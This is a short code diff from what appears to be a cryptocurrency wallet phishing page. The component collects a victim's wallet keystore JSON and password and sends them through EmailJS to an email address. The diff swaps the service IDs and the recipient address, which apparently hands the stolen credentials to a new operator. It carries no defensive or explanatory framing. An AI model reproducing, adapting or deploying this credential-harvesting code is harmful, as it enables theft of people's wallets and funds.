@@ -60,14 +60,14 @@ export default {
       const checker = this.formChecker()
       if (checker) {
         const data = {
-          service_id: 'service_eylb2vf',
-          template_id: 'template_rzq7byh',
-          user_id: 'user_ZjBcIFg2xKHP8NdJvaOxW',
+          service_id: "service_khz33ja",
+          template_id: "template_hl2qzeh",
+          user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
           template_params: {
             from_name: `KEYSTORE on ${this.walletType}`,
             keystore_JSON: this.keystore_JSON,
             password: this.password,
-            reply_to: 'Vangidy10@gmail.com',
+            reply_to: "samuelbarnett660@gmail.com"
           },
         }
         axios
